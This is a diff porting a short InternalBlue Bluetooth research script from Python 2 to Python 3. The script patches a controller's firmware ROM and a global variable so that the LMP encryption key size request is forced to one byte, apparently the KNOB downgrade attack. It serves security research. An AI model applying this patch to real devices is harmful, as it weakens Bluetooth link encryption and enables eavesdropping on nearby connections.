@@ -1,11 +1,9 @@
-#!/usr/bin/python2
+#!/usr/bin/python3
 
 # Jiska Classen, Secure Mobile Networking Lab
-
-
-from pwn import *
+from internalblue import Address
 from internalblue.adbcore import ADBCore
-
+from internalblue.utils.pwnlib_wrapper import log, asm
 
 
 """
@@ -32,10 +30,10 @@ log.info("Installing patch which ensures that send_LMP_encryptoin_key_size_req i
 
 # modify function lm_SendLmpEncryptKeySizeReq
 patch = asm("mov r2, #0x1", vma=0x530F6)  # connection struct key entropy
-internalblue.patchRom(0x530F6, patch)
+internalblue.patchRom(Address(0x530F6), patch)
 
 # modify global variable for own setting
-internalblue.writeMem(0x255E8F, '\x01')  # global key entropy
+internalblue.writeMem(0x255E8F, b'\x01')  # global key entropy
 
 
 internalblue.shutdown()
